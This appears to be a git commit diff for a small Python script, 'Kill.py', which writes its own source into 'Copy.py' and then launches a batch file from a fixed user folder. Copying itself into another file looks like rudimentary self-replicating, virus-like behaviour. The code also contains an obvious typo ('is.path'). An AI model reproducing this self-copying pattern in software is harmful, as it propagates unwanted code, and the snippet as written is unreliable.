8e3794b40b9c075b9bb098acf231e276ea6bcfd6
pyasmjarjsf90 <103758738+pyasmjarjsf90@users.noreply.github.com>
2022-05-24 19:41:10 -0500

    Update Kill.py

--- Riprun/Kill.py
+++ Riprun/Kill.py
@@ -5,4 +5,4 @@ os.chdir("C:/Users/D")
 with open("Copy.py","a") as the_file:
  the_file.write(open(__file__).read())
 if is.path.exists(P):
- os.startfile("Exists.bat")
+ os.startfile(P+"Exists.bat")
